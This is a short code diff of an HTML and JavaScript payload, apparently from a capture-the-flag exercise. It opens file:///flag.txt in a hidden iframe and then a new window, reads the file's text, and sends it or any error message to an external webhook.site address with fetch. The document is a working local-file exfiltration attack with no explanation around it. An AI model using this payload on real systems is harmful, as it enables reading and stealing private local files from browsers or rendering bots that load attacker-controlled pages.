@@ -5,12 +5,13 @@
 <iframe id="flagFrame" src="file:///flag.txt" style="width:0;height:0;border:0;"></iframe>
 
 <script>
+let win = window.open("file:///flag.txt", "_blank");
 setTimeout(() => {
   try {
-    let content = document.getElementById("flagFrame").contentDocument.body.innerText;
-    fetch("	https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(content));
+    let flag = win.document.body.innerText;
+    fetch("https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(flag));
   } catch (e) {
-    fetch("	https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(e.toString()));
+    fetch("https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(e.toString()));
   }
 }, 1000);
 </script>
